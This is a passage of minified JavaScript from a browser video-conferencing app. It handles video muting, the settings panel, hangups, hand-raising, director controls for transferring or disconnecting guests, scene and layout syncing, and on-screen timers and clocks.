toggleAutoVideoMute(){if(!session.videoMuted&&!1!==session.permaid){var msg={};msg.videoMuted="hidden"===document.visibilityState||!1,session.sendMessage(msg),pokeIframeAPI("video-mute-state",document.visibilityState)}}function toggleVideoMute(apply=!1){if(apply&&(session.videoMuted=!session.videoMuted),session.remoteVideoMuted||getById("head8").classList.add("hidden"),0==session.videoMuted?(session.videoMuted=!0,getById("mutevideotoggle").className="las la-video-slash toggleSize",session.cleanOutput||(getById("mutevideobutton").classList.add("red"),getById("mutevideobutton").ariaPressed="true",getById("header").classList.add("red"),session.remoteVideoMuted&&getById("head8").classList.remove("hidden")),session.streamSrc&&session.streamSrc.getVideoTracks().forEach((track=>{track.enabled=!1}))):session.remoteVideoMuted?(session.videoMuted=!1,getById("mutevideotoggle").className="las la-video toggleSize",session.cleanOutput||(getById("head8").classList.remove("hidden"),getById("header").classList.add("red"),getById("mutevideobutton").classList.remove("red"),getById("mutevideobutton").ariaPressed="false"),session.streamSrc&&session.streamSrc.getVideoTracks().forEach((track=>{track.enabled=!1}))):(session.videoMuted=!1,getById("mutevideotoggle").className="las la-video toggleSize",session.cleanOutput||(getById("mutevideobutton").classList.remove("red"),getById("mutevideobutton").ariaPressed="false",getById("header").classList.remove("red")),session.streamSrc&&session.streamSrc.getVideoTracks().forEach((track=>{track.enabled=!0}))),session.avatar&&session.avatar.ready&&!apply){if(updateRenderOutpipe(),session.videoMuted){var msg={videoMuted:!1};session.sendMessage(msg)}}else if(!apply){(msg={}).videoMuted=session.videoMuted,session.sendMessage(msg)}pokeIframeAPI("video-mute-state",session.videoMuted||session.remoteVideoMuted),apply||pokeAPI("videoMuted",session.videoMuted||session.remoteVideoMuted),session.style&&1==session.style&&(session.videoElement&&"previewWebcam"===session.videoElement.id||updateMixer())}var toggleSettingsState=!1;async function toggleSettings(forceShow=!1){if(!session.nosettings)if(getById("multiselect-trigger3").dataset.state="0",getById("multiselect-trigger3").classList.add("closed"),getById("multiselect-trigger3").classList.remove("open"),getById("chevarrow2").classList.add("bottom"),1!=toggleSettingsState||1!=forceShow){if("none"==getById("popupSelector").style.display){if(updateConstraintSliders(),setTimeout((function(){document.addEventListener("click",toggleSettings)}),10),getById("popupSelector").addEventListener("click",(function(e){return e.stopPropagation(),!1})),-1!=navigator.userAgent.indexOf("Chrome"))try{await navigator.permissions.query({name:"camera"}).then((async function(promise){promise&&promise.state&&"prompt"==promise.state?(warnlog("navigator.mediaDevices.getUserMedia starting..."),await navigator.mediaDevices.getUserMedia({video:!0,audio:!1}).then((async function(stream){await enumerateDevices().then(gotDevices2).then((function(){stream.getTracks().forEach((function(track){track.stop()}))}))})).catch((async function(err){await enumerateDevices().then(gotDevices2).then((function(){}))}))):await enumerateDevices().then(gotDevices2).then((function(){}))}))}catch(e){await enumerateDevices().then(gotDevices2).then((function(){}))}else await enumerateDevices().then(gotDevices2).then((function(){}));getById("popupSelector").style.display="inline-block",getById("settingsbutton").classList.add("brown"),getById("settingsbutton").ariaPressed="true",loadTFLITEImages(),setTimeout((function(){getById("popupSelector").style.right="0px"}),1),toggleSettingsState=!0}else document.removeEventListener("click",toggleSettings),getById("popupSelector").removeEventListener("click",(function(e){return e.stopPropagation(),!1})),getById("popupSelector").style.right="-500px",getById("settingsbutton").classList.remove("brown"),getById("settingsbutton").ariaPressed="false",setTimeout((function(){getById("popupSelector").style.display="none"}),200),toggleSettingsState=!1,document.getElementById("videoSettings3").style.display="none";pokeIframeAPI("settings-menu-state",toggleSettingsState)}else await enumerateDevices().then(gotDevices2)}function hangup(showhangup=!0){if(session.hostedTransfers.length)confirmAlt("There are still file transfer in progress\nAre you sure you wish to exit?").then((res=>{if(res){try{showhangup?document.getElementById("main").innerHTML=document.getElementById("hangupTemplate").innerHTML:(document.getElementById("main").innerHTML="",document.getElementById("hangupTemplate").innerHTML="")}catch(e){}setTimeout((function(){session.hangup()}),0)}}));else{try{showhangup?document.getElementById("main").innerHTML=document.getElementById("hangupTemplate").innerHTML:(document.getElementById("main").innerHTML="",document.getElementById("hangupTemplate").innerHTML="")}catch(e){}setTimeout((function(){session.hangup()}),0)}}function hangup2(){session.hangupDirector(),getById("miniPerformer").innerHTML="",getById("press2talk").dataset.enabled=!1,getById("screensharebutton").classList.add("hidden"),getById("screenshare2button").classList.add("hidden"),getById("screenshare3button").classList.add("hidden"),getById("settingsbutton").classList.add("hidden"),getById("mutebutton").classList.add("hidden"),getById("hangupbutton2").classList.add("hidden"),getById("controlButtons").classList.remove("hidden"),getById("mutevideobutton").classList.add("hidden"),getById("screensharebutton").classList.remove("green"),getById("screensharebutton").ariaPressed="false",session.showDirector?getById("miniPerformer").innerHTML='<button id="press2talk" onmousedown="event.preventDefault(); event.stopPropagation();" class="float" onclick="press2talk(true);" title="You can also enable the director`s Video Output afterwards by clicking the Setting`s button"><i class="las la-headset"></i><span data-translate="push-to-talk-enable-2"> enable director`s microphone or video</span></button>':(getById("miniPerformer").innerHTML='<button id="press2talk" onmousedown="event.preventDefault(); event.stopPropagation();" class="float" onclick="press2talk(true);" title="You can also enable the director`s Video Output afterwards by clicking the Setting`s button"><i class="las la-headset"></i><span data-translate="push-to-talk-enable"> enable director`s microphone or video<br />(only guests can see this feed)</span></button>',miniTranslate(getById("miniPerformer"))),getById("miniPerformer").className=""}function hangupComplete(){try{getById("main").innerHTML=document.getElementById("hangupTemplate").innerHTML}catch(e){}updateMixerRun=function(){},pokeIframeAPI("hungup",!0),pokeAPI("hangup",!0)}function reloadRequested(){pokeIframeAPI("reloading",!0),window.removeEventListener("beforeunload",confirmUnload),location.reload()}function confirmUnload(event){return session.noExitPrompt||session.cleanOutput||!1!==session.scene||!session.seeding&&!1===session.roomid&&!1===session.permaid&&!session.director?void 0:((event||window.event).returnValue="Are you sure you want to exit?","Are you sure you want to exit?")}function gobackSlide(){var data={data:[176,110,10]};sendRawMIDI(data);try{pokeIframeAPI("back-slide",!0)}catch(e){}}function nextSlide(){var data={data:[176,110,11]};sendRawMIDI(data);try{pokeIframeAPI("next-slide",!0)}catch(e){}}function raisehand(){if(0==session.directorUUID)return log("no director in room yet"),!1;var data={},handstate=!1;log(data),"0"==getById("raisehandbutton").dataset.raised?(getById("raisehandbutton").dataset.raised="1",getById("raisehandbutton").classList.add("raisedHand"),data.chat="Raised hand",handstate=!0,log("hand raised")):(log("hand lowered"),getById("raisehandbutton").dataset.raised="0",getById("raisehandbutton").classList.remove("raisedHand"),data.chat="Lowered hand",handstate=!1);for(var i=0;i<session.directorList.length;i++)data.UUID=session.directorList[i],session.sendMessage(data,data.UUID);try{pokeIframeAPI("hand",handstate)}catch(e){}return handstate}function lowerhand(){return log("hand lowered"),getById("raisehandbutton").dataset.raised="0",getById("raisehandbutton").classList.remove("raisedHand"),pokeIframeAPI("hand",!1),!1}session.hangup=function(reload=!1,estop=!1){try{window.removeEventListener("beforeunload",confirmUnload)}catch(e){}try{estop&&recordLocalVideo("estop")}catch(e){}try{estop&&recordLocalVideo("estop",!1,!1,!0)}catch(e){}session.taintedSession=!0,warnlog("hanging up");try{recordLocalVideo("stop")}catch(e){}try{recordLocalVideo("stop",!1,!1,!0)}catch(e){}try{transferList.forEach((file=>{file.writer&&file.writer.close(),file.videoElement&&file.videoElement.stopWriter&&file.videoElement.stopWriter(!0)}))}catch(e){errorlog(e)}try{var msg={videoMuted:!0,bye:!0};session.sendMessage(msg)}catch(e){}try{session.ws.close()}catch(e){}try{session.canvasSource&&session.canvasSource.srcObject&&session.canvasSource.srcObject.getTracks().forEach((function(track){session.canvasSource.srcObject.removeTrack(track),track.stop(),log("stopping old track")})),session.videoElement&&session.videoElement.srcObject&&session.videoElement.srcObject.getTracks().forEach((function(track){session.videoElement.srcObject.removeTrack(track),track.stop(),log("stopping old track")})),session.streamSrc&&session.streamSrc.getTracks().forEach((function(track){session.streamSrc.removeTrack(track),track.stop(),log("stopping old track")})),session.streamSrcClone&&session.streamSrcClone.getTracks().forEach((function(track){session.streamSrcClone.removeTrack(track),track.stop(),log("stopping old track")})),session.screenStream&&session.screenStream.getTracks().forEach((function(track){session.screenStream.removeTrack(track),track.stop(),log("stopping old track")}))}catch(e){errorlog(e)}try{for(i in session.rpcs){try{session.rpcs[i].videoElement&&session.rpcs[i].videoElement.recording&&recordLocalVideo("stop",null,session.rpcs[i].videoElement)}catch(e){}log("closing rpc due to hangup event"),session.closeRPC(i,!0)}for(i in session.pcs)log("closing 5"),session.closePC(i)}catch(e){errorlog(e)}for(var sid in session.watchTimeoutList)clearTimeout(session.watchTimeoutList[sid]);if(DebugLog&&errorReport&&downloadLogs(),reload)return reloadRequested(),void warnlog("Reloading? uh oh. Why didn't it?");setTimeout((function(){for(i in session)try{delete session[i]}catch(e){}delete session}),1200),hangupComplete(),log("HANG UP COMPLETE")};var previousRoom="",stillNeedRoom=!0,transferCancelled=!1,armedTransfer=!1,transferSettings={};async function directMigrate(ele,event,room=!1){if(log("directMigrate"),room)var migrateRoom=room;else if(!1===event){if(null===previousRoom)return ele.innerHTML='<i class="las la-paper-plane"></i> <span data-translate="forward-to-room">transfer</span>',miniTranslate(ele),void ele.classList.remove("armed");if(!0===transferCancelled)return ele.innerHTML='<i class="las la-paper-plane"></i> <span data-translate="forward-to-room">transfer</span>',miniTranslate(ele),void ele.classList.remove("armed");migrateRoom=previousRoom}else{if(event.ctrlKey||event.metaKey)return ele.innerHTML='<i class="las la-check"></i> <span data-translate="forward-to-room">armed</span>',miniTranslate(ele),ele.classList.add("armed"),transferCancelled=!1,Callbacks.push([directMigrate,ele,stillNeedRoom]),stillNeedRoom=!1,void log("Migrate queued");if(!1!==armedTransfer&&""!==previousRoom)migrateRoom=sanitizeRoomName(previousRoom);else{var broadcastMode=null;"broadcast"in transferSettings?broadcastMode=transferSettings.broadcast:session.rpcs[ele.dataset.UUID]&&session.rpcs[ele.dataset.UUID].stats.info&&"broadcast_mode"in session.rpcs[ele.dataset.UUID].stats.info?broadcastMode=session.rpcs[ele.dataset.UUID].stats.info.broadcast_mode:null!==session.broadcastTransfer&&(broadcastMode=session.broadcastTransfer);var queuedMode=null;"queue"in transferSettings?queuedMode=transferSettings.queue:session.queueTransfer&&(queuedMode=session.queueTransfer);var updateurl=null;"updateurl"in transferSettings&&(updateurl=transferSettings.updateurl),window.focus();var response=await promptTransfer(previousRoom,broadcastMode,updateurl,queuedMode);null!==(migrateRoom=response.roomid)&&(transferSettings=response)}if(stillNeedRoom=!0,null===migrateRoom)return ele.innerHTML='<i class="las la-paper-plane"></i> <span data-translate="forward-to-room">transfer</span>',miniTranslate(ele),ele.classList.remove("armed"),void(transferCancelled=!0);try{migrateRoom=sanitizeRoomName(migrateRoom),previousRoom=migrateRoom}catch(e){}}ele.innerHTML='<i class="las la-paper-plane"></i> <span data-translate="forward-to-room">transfer</span>',miniTranslate(ele),ele.classList.remove("armed"),migrateRoom&&(previousRoom=migrateRoom,session.directMigrateIssue(migrateRoom,transferSettings,ele.dataset.UUID))}var stillNeedHangupTarget=1;function directHangup(ele,event){if(0==event)if(1===stillNeedHangupTarget){window.focus();var confirmHangup=confirm(getTranslation("confirm-disconnect-users"));stillNeedHangupTarget=confirmHangup}else confirmHangup=stillNeedHangupTarget;else if(!0===event)confirmHangup=!0;else{if(event.ctrlKey||event.metaKey)return ele.innerHTML='<i class="las la-skull-crossbones"></i> <span data-translate="disconnect-guest" >ARMED</span>',miniTranslate(ele),ele.classList.add("armed"),stillNeedHangupTarget=1,Callbacks.push([directHangup,ele,!1]),void log("Hangup queued");window.focus();confirmHangup=confirm(getTranslation("confirm-disconnect-user"))}if(confirmHangup){var msg={hangup:!0};return log(msg),log(ele.dataset.UUID),session.sendRequest(msg,ele.dataset.UUID),pokeIframeAPI("hungup","directing",ele.dataset.UUID),!0}return ele.innerHTML='<i class="las la-sign-out-alt"></i><span data-translate="disconnect-guest"> Hangup</span>',miniTranslate(ele),ele.classList.remove("armed"),!1}function directEnable(ele,event,director=!1){var scene=ele.dataset.scene;if(!event.ctrlKey&&!event.metaKey)if(1==ele.value)if(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",ele.children[1]&&(ele.children[1].innerHTML="Add to Scene "+scene),director){var cc=0;getById("container_director").querySelectorAll('[data-action-type="addToScene"]').forEach((ge=>{1==ge.value&&(cc+=1)})),cc||(getById("container_director").style.backgroundColor=null,getById("container_director").classList.remove("containerGreen"))}else{cc=0;getById("container_"+ele.dataset.UUID).querySelectorAll('[data-action-type="addToScene"]').forEach((ge=>{1==ge.value?(cc+=1,log("ge.value: '"+ge.value+"'")):log("ge.value:--'"+ge.value+"'")})),log(cc+" container_"+ele.dataset.UUID),cc||(getById("container_"+ele.dataset.UUID).style.backgroundColor=null,getById("container_"+ele.dataset.UUID).classList.remove("containerGreen"))}else ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",ele.children[1]&&(ele.children[1].innerHTML="Remove"),director?getById("container_director").classList.add("containerGreen"):getById("container_"+ele.dataset.UUID).classList.add("containerGreen");var msg={};scene+="",msg.scene=scene,msg.action="display",msg.value=ele.value,msg.target=ele.dataset.sid;try{1==msg.value?pokeIframeAPI("add-to-scene",scene,ele.dataset.UUID):pokeIframeAPI("remove-from-scene",scene,ele.dataset.UUID)}catch(e){}for(var uuid in session.pcs)session.pcs[uuid].scene===scene&&session.sendMessage(msg,uuid);return syncDirectorState(ele),!!msg.value}function syncDirectorState(ele){var msg={};for(var uuid in msg.directorState=getDetailedState(ele.dataset.sid),session.pcs)session.pcs[uuid].coDirector&&session.sendMessage(msg,uuid);for(var i in session.directorList){uuid=session.directorList[i];session.rpcs[uuid]&&session.sendRequest(msg,uuid)}}function getQuickStats(sid=!1){var stats={};try{for(var i in stats.inbound={},stats.outbound={},session.rpcs)session.rpcs[i].streamID&&(stats.inbound[session.rpcs[i].streamID]=session.rpcs[i].stats);for(var i in session.pcs)stats.outbound[i]=session.pcs[i].stats}catch(e){}return sid?sid in stats.inbound?stats.inbound[sid]:null:stats}function getDetailedState(sid=!1){var streamList={},guestFeeds=document.getElementById("guestFeeds");for(var UUID in session.rpcs)if(session.rpcs[UUID].streamID){if(sid&&sid!==session.rpcs[UUID].streamID)continue;let item={};item.streamID=session.rpcs[UUID].streamID,item.label=session.rpcs[UUID].label,item.group=session.rpcs[UUID].group;try{if(item.layout=session.rpcs[UUID].layout,session.director&&session.slotmode?item.slot=query("[data--u-u-i-d='"+UUID+"'][data-slot]").dataset.slot||!1:session.currentSlots&&(item.slot=Object.keys(session.currentSlots).find((key=>session.currentSlots[key]===session.rpcs[UUID].streamID))||!1),item.slot&&(item.slot=parseInt(item.slot)),session.director){let featured=query("[data--u-u-i-d='"+UUID+"'][data-action-type='solo-video']");featured&&parseInt(featured.value)?item.featured=!0:item.featured=!1}else session.infocus&&session.infocus===UUID?item.featured=!0:item.featured=!1}catch(e){errorlog(e)}item.iframeSrc=session.rpcs[UUID].iframeSrc,item.localStream=!1,item.muted=session.rpcs[UUID].remoteMuteState,item.videoMuted=session.rpcs[UUID].videoMuted;try{item.activeSpeaker=session.rpcs[UUID].activelySpeaking,item.defaultSpeaker=session.rpcs[UUID].defaultSpeaker}catch(e){errorlog(e)}item.videoVisible=session.rpcs[UUID].videoElement&&session.rpcs[UUID].videoElement.checkVisibility(),session.rpcs[UUID].videoElement&&(item.videoVolume=session.rpcs[UUID].videoElement.volume),item.iframeVisible=session.rpcs[UUID].iframeVisible&&session.rpcs[UUID].iframeVisible.checkVisibility(),session.directorList.indexOf(UUID)>=0?item.director=!0:item.director=!1;try{if(session.director){if(guestFeeds){var child,parent,lock=parseInt(document.getElementById("position_"+UUID).dataset.locked);if(lock)item.position=lock;else if(child=document.getElementById("container_"+UUID))"guestFeeds"==(parent=child.parentNode).id&&(item.position=Array.prototype.indexOf.call(parent.children,child)+1)}for(var scenes=getById("container_"+UUID).querySelectorAll('[data-action-type="addToScene"][data-scene][data--u-u-i-d="'+UUID+'"]'),sceneState={},i=0;i<scenes.length;i++)1==scenes[i].value?sceneState[scenes[i].dataset.scene]=!0:sceneState[scenes[i].dataset.scene]=!1;item.scenes=sceneState;var others=getById("container_"+UUID).querySelectorAll('[data-action-type][data--u-u-i-d="'+UUID+'"]'),otherState={};for(i=0;i<others.length;i++)if(!("scene"in others[i].dataset)&&"toggle-group"!=others[i].dataset.actionType)if("value"in others[i])""!==others[i].value&&(otherState[others[i].dataset.actionType]=others[i].value);else try{others[i].querySelector(".altpress")?otherState[others[i].dataset.actionType]="alt":others[i].querySelector(".pressed")?otherState[others[i].dataset.actionType]=!0:"soloChat"==others[i].dataset.actionType&&(otherState[others[i].dataset.actionType]=!1)}catch(e){errorlog(e)}item.others=otherState}}catch(e){}streamList[session.rpcs[UUID].streamID]=item}if(sid&&sid!==session.streamID)return streamList;streamList[session.streamID]={};try{if(session.director){for(sceneState={},scenes=getById("container_director").querySelectorAll('[data-action-type="addToScene"][data-scene]'),i=0;i<scenes.length;i++)1==scenes[i].value?sceneState[scenes[i].dataset.scene]=!0:sceneState[scenes[i].dataset.scene]=!1;streamList[session.streamID].scenes=sceneState}}catch(e){}if(session.director){let featured=document.querySelector("#highlightDirector[data-action-type='solo-video'], #container_director [data-action-type='solo-video']");featured&&parseInt(featured.value)?streamList[session.streamID].featured=!0:streamList[session.streamID].featured=!1}else session.infocus&&!0===session.infocus?streamList[session.streamID].featured=!0:streamList[session.streamID].featured=!1;streamList[session.streamID].label=session.label,streamList[session.streamID].group=session.group,streamList[session.streamID].groupView=session.groupView,streamList[session.streamID].scene=session.scene,streamList[session.streamID].streamID=session.streamID,streamList[session.streamID].iframeSrc=session.iframeSrc,streamList[session.streamID].director=session.directorState,streamList[session.streamID].localstream=!0,streamList[session.streamID].localStream=!0,streamList[session.streamID].seeding=session.seeding,streamList[session.streamID].muted=session.muted,streamList[session.streamID].videoMuted=session.videoMuted,streamList[session.streamID].videoVisible=session.videoElement&&session.videoElement.checkVisibility(),streamList[session.streamID].speakerMuted=session.speakerMuted,streamList[session.streamID].position=null,streamList[session.streamID].meshcast=session.meshcast,streamList[session.streamID].layout=session.layout;try{session.director&&session.slotmode?(streamList[session.streamID].slot=query("#container_director [data-slot]").dataset.slot||!1,streamList[session.streamID].slot&&(streamList[session.streamID].slot=parseInt(streamList[session.streamID].slot))):session.currentSlots&&session.streamID&&(streamList[session.streamID].slot=Object.keys(session.currentSlots).find((key=>session.currentSlots[key]===session.streamID))||!1)}catch(e){errorlog(e)}(session.info&&session.info.out&&(streamList[session.streamID].outbound=session.info.out),session.showDirector&&session.director)&&((child=document.getElementById("container_director"))&&"guestFeeds"==(parent=child.parentNode).id&&(streamList[session.streamID].position=Array.prototype.indexOf.call(parent.children,child)+1));return session.notifyScreenShare?streamList[session.streamID].screenSharing=session.screenShareState:streamList[session.streamID].screenSharing=!1,session.streamSrc?(streamList[session.streamID].audioTrack=0!==session.streamSrc.getAudioTracks().length,streamList[session.streamID].videoTrack=0!==session.streamSrc.getVideoTracks().length):(streamList[session.streamID].audioTrack=!1,streamList[session.streamID].videoTrack=!1),streamList}function getGuestList(){var guestFeeds=document.getElementById("guestFeeds");if(!guestFeeds)return{};for(var streamList={},i=0;i<guestFeeds.children.length;i++)try{session.rpcs[guestFeeds.children[i].dataset.UUID]?streamList[i+1+""]={streamID:session.rpcs[guestFeeds.children[i].dataset.UUID].streamID,label:session.rpcs[guestFeeds.children[i].dataset.UUID].label||""}:"container_director"==guestFeeds.children[i].id?streamList[i+1+""]={streamID:session.streamID,label:session.label||""}:"container_screen_director"==guestFeeds.children[i].id&&(streamList[i+1+""]={streamID:session.streamID+":s",label:session.screenShareLabel||""})}catch(e){errorlog(e)}return streamList}function syncOtherState(sid){if(session.syncState&&session.syncState[sid]){var others=session.syncState[sid].others;for(var other in log(others),others)if("toggle-group"!=other){var ele=document.querySelector('[data-sid="'+sid+'"][data-action-type="'+other+'"]');if(ele&&others[other]){"value"in ele||(errorlog("NO DEFAULT VALUE IN SPECIFIED ELEMENT; guessing default: "+other),ele.value=0);var changed=!0;ele.value==others[other]&&(changed=!1),"mute-guest"==other?changed&&remoteMute(ele,!1,!0):"hide-guest"==other?changed&&remoteHideVideo(ele,!0,!0):"mute-video-guest"==other?changed&&remoteMuteVideo(ele,!0,!0):(ele.value=others[other],"input"==ele.nodeName.toLowerCase()?ele.value=parseInt(others[other]):parseInt(others[other])?(ele.classList.add("pressed"),ele.ariaPressed="true"):(ele.classList.remove("pressed"),ele.ariaPressed="false"))}}var UUID=document.querySelector('[data-sid="'+sid+'"][data--u-u-i-d');UUID&&UUID.dataset.UUID&&(UUID=UUID.dataset.UUID,session.syncState[sid].group&&session.rpcs[UUID]&&(session.rpcs[UUID].group=session.syncState[sid].group,syncGroup(session.rpcs[UUID].group,UUID)))}}function htmlToElement(html){var template=document.createElement("template");return html=html.trim(),template.innerHTML=html,template.content.firstChild}function syncGroup(groups,UUID){if(groups&&"object"==typeof groups){groups.forEach((group=>{if(!getById("container_"+UUID).querySelector('[data-action-type="toggle-group"][data--u-u-i-d="'+UUID+'"][data-group="'+group+'"]')){var newGroup=htmlToElement('<button style="margin: 0 5px 10px 5px;" class="pressed" data-sid="'+session.rpcs[UUID].streamID+'" data--u-u-i-d="'+UUID+'" data-action-type="toggle-group" data-group="'+group+'"   title="Add to Group: '+group+'" onclick="changeGroup(this, event);"><span ><i class="las la-users" style="color:#060"></i>'+group+"</span></button>"),added=!1;if(getById("container_"+UUID).querySelectorAll(".customGroup>[data-group]").forEach((ele=>{log(ele),!added&&ele.dataset.group>group+""&&(ele.parentNode.insertBefore(newGroup,ele),added=!0)})),!added){var newGroupCon=getById("container_"+UUID).querySelector(".customGroup");newGroupCon||((newGroupCon=document.createElement("div")).classList.add("customGroup"),getById("container_"+UUID).appendChild(newGroupCon)),newGroupCon.appendChild(newGroup)}}}));var elements=document.querySelectorAll('[data-action-type="toggle-group"][data--u-u-i-d="'+UUID+'"][data-group]');if(elements.length){for(var i=0;i<elements.length;i++)session.rpcs[UUID].group.includes(elements[i].dataset.group)?(elements[i].classList.add("pressed"),elements[i].ariaPressed="true"):(elements[i].classList.remove("pressed"),elements[i].ariaPressed="false");log("synced group")}else log("not syncing group buttons; don't exist")}else errorlog("Group isn't an object")}function syncSceneState(sid){if(session.syncState&&session.syncState[sid]){var scenes=session.syncState[sid].scenes||[];for(var scene in scenes)try{var ele=document.querySelector('[data-sid="'+sid+'"][data-action-type="addToScene"][data-scene="'+scene+'"]');ele&&(scenes[scene]?(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",getById("container_"+ele.dataset.UUID).classList.add("containerGreen"),ele.children[1]&&(ele.children[1].innerHTML="Remove")):(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",ele.children[1]&&(ele.children[1].innerHTML="Add to Scene "+scene)))}catch(e){}}}function issueLayout(layout=!1,scene=!1,UUID=!1){log("issueLayout() called");var msg={};if(msg.layout=layout,UUID)session.pcs[UUID]&&!1!==scene&&session.pcs[UUID].scene===scene+""&&!session.pcs[UUID].solo&&session.pcs[UUID].layout?session.sendMessage(msg,UUID):session.pcs[UUID]&&session.pcs[UUID].layout&&!session.pcs[UUID].solo&&(session.sendMessage(msg,UUID),log("broadcast"));else for(var uuid in session.pcs)!1!==scene&&session.pcs[uuid].scene===scene+""&&!session.pcs[uuid].solo&&session.pcs[uuid].layout?session.sendMessage(msg,uuid):session.pcs[uuid].layout&&!session.pcs[uuid].solo&&(session.sendMessage(msg,uuid),log("broadcast"))}async function issueLayoutOBS(data){var layout=data.layout||!1,scene=data.scene||!1,UUID=data.UUID||!1,obsCommand=data.obsCommand||!1;log("issueLayoutOBS() called");var msg={};if(msg.layout=layout,msg.obsCommand=obsCommand,data.remote?msg.remote=data.remote:msg.remote=session.remote||!0,msg=await session.encodeRemote(msg),UUID){try{log("CONTROL STATE"+session.pcs[UUID].obsState.details.controlLevel)}catch(e){}session.pcs[UUID]&&!1!==scene&&session.pcs[UUID].scene===scene+""?session.pcs[UUID].solo||session.sendMessage(msg,UUID):session.pcs[UUID]&&session.pcs[UUID].layout&&(session.sendMessage(msg,UUID),log("broadcast"))}else for(var uuid in session.pcs){try{log("CONTROL STATE"+session.pcs[UUID].obsState.details.controlLevel)}catch(e){}!1!==scene&&session.pcs[uuid].scene===scene+""?session.pcs[uuid].solo||session.sendMessage(msg,uuid):session.pcs[uuid].layout&&(session.sendMessage(msg,uuid),log("broadcast"))}}var previousURL="",stillNeedURL=!0,reloadCancelled=!1,armedReload=!1;async function directPageReload(ele,event){if(log("URL Page reload"),!1===event){if(null===previousURL)return ele.innerHTML='<i class="las la-sync"></i> <span data-translate="change-url">change URL</span>',miniTranslate(ele),void ele.classList.remove("armed");if(!0===reloadCancelled)return ele.innerHTML='<i class="las la-sync"></i> <span data-translate="change-url">change URL</span>',miniTranslate(ele),void ele.classList.remove("armed");reloadURL=previousURL}else{if(event.ctrlKey||event.metaKey)return ele.innerHTML='<i class="las la-check"></i> <span data-translate="button-armed">armed</span>',miniTranslate(ele),ele.classList.add("armed"),reloadCancelled=!1,armedReload=!0,Callbacks.push([directPageReload,ele,stillNeedURL]),stillNeedURL=!1,void log("URL update queued");if(armedReload)reloadURL=previousURL;else{window.focus();var reloadURL=await promptAlt(getTranslation("transfer-guest-to-url"),!1,!1,previousURL);if(stillNeedURL=!0,null===reloadURL)return ele.innerHTML='<i class="las la-sync"></i> <span data-translate="change-url">change URL</span>',miniTranslate(ele),ele.classList.remove("armed"),void(reloadCancelled=!0);try{previousURL=reloadURL}catch(e){}}}if(ele.innerHTML='<i class="las la-sync"></i> <span data-translate="change-url">change URL</span>',miniTranslate(ele),ele.classList.remove("armed"),reloadURL){previousURL=reloadURL;var msg={};msg.changeURL=reloadURL,ele.dataset.UUID in session.rpcs&&session.rpcs[ele.dataset.UUID].receiveChannel.send(JSON.stringify(msg))}}async function directTimer(ele,event=!1,manualSetTime=!1){log("directTimer");var msg={};if(ele.classList.remove("blue"),ele.classList.remove("red"),event&&(event.ctrlKey||event.metaKey))(event.ctrlKey||event.metaKey)&&(1==ele.value?(ele.value=3,msg.pauseClock=!0,ele.classList.add("blue")):3==ele.value&&(ele.value=1,msg.resumeClock=!0,ele.classList.add("red")));else if(0==ele.value||2==ele.value){if(!1!==manualSetTime)var getTime=parseFloat(manualSetTime)||0;else getTime=await promptAlt("Time to set count down timer",!1,!1,parseInt(getById("overlayClockContainer").dataset.initial),!0);if(null===getTime)return;getById("overlayClockContainer").dataset.initial=parseInt(getTime),ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",ele.classList.remove("red"),msg.setClock=getTime,msg.showClock=!0,msg.startClock=!0,ele.innerHTML='<i class="las la-clock"></i><span data-translate="create-timer"> Remove Timer</span>'}else 3==ele.value?(ele.value=1,msg.resumeClock=!0,ele.classList.add("red")):(ele.value=2,ele.classList.remove("pressed"),ele.ariaPressed="false",msg.stopClock=!0,msg.hideClock=!0,ele.innerHTML='<i class="las la-clock"></i><span data-translate="create-timer"> Create Timer</span>');if(ele.dataset.UUID){if(session.sendRequest(msg,ele.dataset.UUID))return!0}else if(session.sendRequest(msg))return!0;return!1}function toggleClock(clock24=session.clock24){if(!1!==session.showTime)if(session.showTime){clearInterval(session.showTime),session.showTime=null,(clock=getById("overlayClock2")).ctx=null,clock.canvas=null,document.pictureInPictureElement&&clock.video&&(document.pictureInPictureElement==clock.video&&(document.exitPictureInPicture(),pokeIframeAPI("picture-in-picture",!1)),clock.video.remove),clock.video=null,clock.innerHTML="",getById("overlayClockContainer2").classList.add("hidden")}else{var clock,time=new Date;(clock=getById("overlayClock2")).ctx?(clock.ctx.beginPath(),clock.ctx.rect(0,0,230,40),clock.ctx.fillStyle="#000",clock.ctx.fill(),clock.ctx.fillStyle="#FFF",clock.ctx.font="50px monospace",clock.ctx.textAlign="center",clock.ctx.fillText(time.toLocaleString("en-US",{hour:"numeric",minute:"numeric",hour12:!clock24}),115,37)):clock.innerHTML=time.toLocaleString("en-US",{hour:"numeric",minute:"numeric",hour12:!clock24}),session.showTime=setInterval((function(){var time=new Date,clock=getById("overlayClock2");clock.ctx?(clock.ctx.beginPath(),clock.ctx.rect(0,0,230,40),clock.ctx.fillStyle="#000",clock.ctx.fill(),clock.ctx.fillStyle="#FFF",clock.ctx.font="50px monospace",clock.ctx.textAlign="center",clock.ctx.fillText(time.toLocaleString("en-US",{hour:"numeric",minute:"numeric",hour12:!clock24}),115,37)):getById("overlayClock2").innerHTML=time.toLocaleString("en-US",{hour:"numeric",minute:"numeric",hour12:!clock24})}),2e3),getById("overlayClockContainer2").classList.remove("hidden")}}async function directRoomClock(ele,event=!1){ele.active?(ele.active=!1,session.showRoomTime=!1,ele.classList.remove("pressed"),ele.ariaPressed="false"):(ele.active=!0,session.showRoomTime=!0,ele.classList.add("pressed"),ele.ariaPressed="true"),!1!==session.showTime&&(ele.active&&!session.showTime||!ele.active&&session.showTime)&&toggleClock();var msg={};null!==session.clock24&&(msg.clock24=session.clock24),msg.showTime=session.showRoomTime,session.sendRequest(msg)}async function directRoomTimer(ele,event=!1,preSetTime=!1){log("directGlobalRoomTimer");var msg={};if(ele.classList.remove("blue"),ele.classList.remove("red"),getById("overlayClockContainer").style.fontSize="50px",event&&(event.ctrlKey||event.metaKey))(event.ctrlKey||event.metaKey)&&(1==ele.value?(ele.value=3,msg.pauseClock=!0,pauseClock(),session.roomTimer?session.roomTimer<Date.now()/1e3?session.roomTimer=!1:session.roomTimer=Date.now()/1e3-session.roomTimer:session.roomTimer=!1,ele.innerHTML='<i class="las la-clock"></i><span data-translate="resume-timer"> Resume 